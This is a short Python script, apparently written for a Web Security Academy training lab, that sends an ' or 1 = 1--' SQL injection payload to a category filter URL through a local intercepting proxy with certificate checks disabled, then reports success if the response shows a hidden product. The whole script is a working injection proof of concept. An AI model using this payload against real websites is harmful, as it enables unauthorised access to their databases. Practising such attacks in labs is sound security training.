import sys
import requests
import urllib3

# to disable the warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

payload = " or 1 = 1--"

url = "https://ac901fa51f1cdf8fc00f4da800f800d5.web-security-academy.net/filter?category="

r = requests.get(url + payload, verify=False, proxies=proxies)
if 'Picture Box' in r.text:
    print('[.] Sql injection successful')
else:
    print('[*] Unsuccessful')


